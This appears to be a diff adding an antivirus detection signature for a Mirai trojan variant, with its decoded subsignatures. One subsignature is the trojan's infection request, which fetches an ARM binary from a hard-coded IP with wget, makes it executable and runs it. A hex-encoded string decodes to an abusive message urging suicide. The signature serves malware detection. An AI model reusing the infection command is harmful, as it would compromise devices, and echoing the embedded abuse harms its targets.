@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-7639398-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /shell?cd+/tmp;wget+http://5.196.141.135/bins/arm7;+chmod+777+arm7;+./arm7 HTTP/1.1
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+wget https://urlhaus.abuse.ch/downloads/text_online/ -q
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+User-Agent: Hello, poo
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/x69/x6e/x67/x20/x6d/x65/x20/x63/x61/x6e/x63/x65/x72/x20/x67/x6f/x20/x6b/x79/x73/x20/x72/x69/x67/x68/x74/x20/x6e/x6f/x77
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/x59/x4f/x55/x20/x53/x48/x4f/x55/x4c/x44/x20/x54/x52/x59/x20/x49/x54
